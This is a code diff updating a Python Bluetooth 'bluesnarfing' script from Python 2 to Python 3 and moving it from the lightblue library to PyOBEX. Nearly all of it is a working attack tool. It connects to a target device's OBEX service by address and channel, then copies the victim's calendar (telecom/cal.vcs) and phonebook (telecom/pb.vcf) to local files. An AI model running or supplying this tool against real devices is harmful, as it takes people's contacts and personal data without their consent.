@@ -1,28 +1,47 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
 import sys
 from os.path import basename
-from lightblue.obex import OBEXClient
+from PyOBEX import client, headers, responses
 
+
+def get_file(client, filename):
+    """
+    Use OBEX get to retrieve a file and write it
+    to a local file of the same name
+    """
+    r = client.get(filename)
+
+    if isinstance(r, responses.FailureResponse):
+        print("Failed to get file " + filename)
+    else:
+        headers, data = r
+
+        fh = open(filename, "w+")
+        fh.write(data)
+        fh.close()
+    
 
 if len(sys.argv) < 3:
-    print sys.argv[0] + ": <btaddr> <channel>"
+    print(sys.argv[0] + ": <btaddr> <channel>")
     sys.exit(0)
 
 btaddr = sys.argv[1]
 channel = int(sys.argv[2])
 
-print "Bluesnarfing %s on channel %d" % (btaddr, channel)
+print("Bluesnarfing %s on channel %d" % (btaddr, channel))
 
-obex = OBEXClient(btaddr, channel)
-obex.connect()
+c = client.BrowserClient(btaddr, channel)
+    
+try:
+    r = c.connect()
+except OSError as e:
+    print("Connect failed. " + str(e))
 
-fh = file("calendar.vcs", "w+")
-obex.get({"name": "telecom/cal.vcs"}, fh)
-fh.close()
+if isinstance(r, responses.ConnectSuccess):
+    c.setpath("telecom")
+    
+    get_file(c, "cal.vcs")
+    get_file(c, "pb.vcf")
 
-fh = file("phonebook.vcf", "w+")
-obex.get({"name": "telecom/pb.vcf"}, fh)
-fh.close()
-
-obex.disconnect()
+    c.disconnect()
